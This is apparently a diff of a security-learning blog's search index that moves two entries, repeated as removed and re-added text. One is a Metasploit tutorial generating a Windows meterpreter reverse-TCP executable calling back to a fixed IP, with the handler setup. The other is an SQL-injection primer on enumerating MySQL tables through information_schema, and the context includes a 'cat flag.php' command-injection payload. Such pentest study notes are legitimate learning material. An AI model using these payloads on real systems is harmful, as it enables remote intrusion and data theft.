@@ -718,23 +718,6 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>msf的shell在windows中的利用</title>
-    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>msf的shell的制作</p>
-<a id="more"></a>
-<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
-<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
-<p>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf shell制作</category>
-      </categories>
-  </entry>
-  <entry>
     <title>记一题php$$变量覆盖</title>
     <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
     <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
@@ -778,6 +761,23 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>常见黑魔法</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>msf的shell在windows中的利用</title>
+    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>msf的shell的制作</p>
+<a id="more"></a>
+<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
+<p>输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf shell制作</category>
       </categories>
   </entry>
   <entry>
@@ -1219,43 +1219,6 @@ regex也有以上六种用法</p>
       <categories>
         <category>编程学习</category>
         <category>python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入之mysql学习基础(一)</title>
-    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
-    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
-<a id="more"></a>
-<h1>MySQL的数据库结构</h1>
-<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
-<h1>注入的产生</h1>
-<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
-<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
-<h1>MySQL5注入的一般流程</h1>
-<p>获取字段数-查库名-查表名-查列名-查数据</p>
-<p>获取字段数：order by 临界值<br>
-获取库名：database()<br>
-表名和列名没有内置函数 怎么查？</p>
-<p>union语句：将不同表的两个列查询的数据去重拼接<br>
-union all ：不去重</p>
-<p>获取MySQL版本：version()<br>
-MySQL5.0以下版本只能和access数据库一样猜解<br>
-而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
-information_schema.tables 记录表名信息<br>
-information_schema.columns 记录列名信息<br>
-TABLE_SCHEMA 数据库字段<br>
-table_name 表名<br>
-column_name 列名<br>
-查表名：<br>
-SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
-查列名：<br>
-SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
-查数据：<br>
-select 列名 from 库名.表名</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
       </categories>
   </entry>
   <entry>
@@ -1760,6 +1723,43 @@ select 列名 from 库名.表名</p>
 </tr>
 </tbody>
 </table>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入之mysql学习基础(一)</title>
+    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
+    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
+<a id="more"></a>
+<h1>MySQL的数据库结构</h1>
+<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
+<h1>注入的产生</h1>
+<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
+<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
+<h1>MySQL5注入的一般流程</h1>
+<p>获取字段数-查库名-查表名-查列名-查数据</p>
+<p>获取字段数：order by 临界值<br>
+获取库名：database()<br>
+表名和列名没有内置函数 怎么查？</p>
+<p>union语句：将不同表的两个列查询的数据去重拼接<br>
+union all ：不去重</p>
+<p>获取MySQL版本：version()<br>
+MySQL5.0以下版本只能和access数据库一样猜解<br>
+而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
+information_schema.tables 记录表名信息<br>
+information_schema.columns 记录列名信息<br>
+TABLE_SCHEMA 数据库字段<br>
+table_name 表名<br>
+column_name 列名<br>
+查表名：<br>
+SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
+查列名：<br>
+SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
+查数据：<br>
+select 列名 from 库名.表名</p>
 ]]></content>
       <categories>
         <category>web技术学习</category>
